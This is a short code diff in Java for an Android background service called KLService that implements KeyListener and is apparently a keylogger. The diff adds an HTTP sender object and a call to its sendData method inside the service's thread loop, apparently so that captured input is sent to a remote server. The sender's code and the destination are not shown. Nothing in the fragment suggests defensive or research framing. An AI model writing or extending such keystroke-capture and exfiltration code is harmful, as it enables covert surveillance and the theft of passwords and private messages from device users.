@@ -122,6 +122,7 @@ public class KLService extends Service implements KeyListener {
     final Runnable r = new Runnable() {
         public void run() {
 		    //Thread Run:
+        	KLSHttpSender sender = new KLSHttpSender();
         	//Prepare for a loop(Note to self: Andy requested this..)
         	Looper.prepare();
         	
@@ -143,7 +144,7 @@ public class KLService extends Service implements KeyListener {
         		}
         		
         		//Start Thread Main Code:
-        		
+        		sender.sendData();
         		
         		//END Thread Main Code.
         		
